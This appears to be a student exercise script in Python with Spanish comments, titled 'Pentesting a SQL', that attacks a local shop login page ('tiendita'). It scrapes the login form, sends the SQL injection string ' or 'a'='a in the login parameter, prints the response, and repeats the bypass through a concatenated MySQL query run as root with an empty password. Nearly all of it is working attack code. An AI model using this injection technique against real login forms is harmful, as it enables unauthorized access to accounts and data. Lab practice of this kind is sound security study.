"""Desarrollo: Parte 3 - Pentesting a SQL"""
import requests
import os
import mysql.connector as mysql
from bs4 import BeautifulSoup
#192.168.2.8 coorespondera a localhost
response = requests.get("http://192.168.2.8/tiendita/tiendita_login.htm")
soup = BeautifulSoup(response.text, "lxml")
print("---Estas son las Etiquetas FORM---")
print(soup.find_all('form'))
loginSQL ="' or 'a'='a 'or'"
print("///ARCHIVO A DONDE SE ENVIA LA INFORMACION///")
print(soup.form['action'])
#Prueba con request no se puede hacer con paginas reales por acceso denegado
recibir_login=loginSQL
response = requests.get("http://192.168.2.8/tiendita/"+soup.form['action']+"?login=' or 'a'='a 'or'&password=")
#AQUI PODEMOS VER EL RESULTADO SI SE PUDO HACER SQL INJECTION
print("////RESULTADO DE LA PAGINA///")
print(response.text)
null = []
#PRUEBA CON LA BASE DE DATOS
#Conectandose a la base de datos:
conexion = mysql.connect( host='localhost', user= 'root', passwd='', db='php_tiendita_login')
operacion = conexion.cursor()
operacion.execute("SELECT * FROM clientes WHERE login='"+loginSQL+"' AND password=''")
#Comprobacion de Sql injection, si es diferente de null entronces pudimos entrar SQl necesita al menos un usuario.
if(operacion.fetchall() != null):
    print("Usuario Valido")
else:
    print("Usuario NO Valido!!!")
conexion.close()



   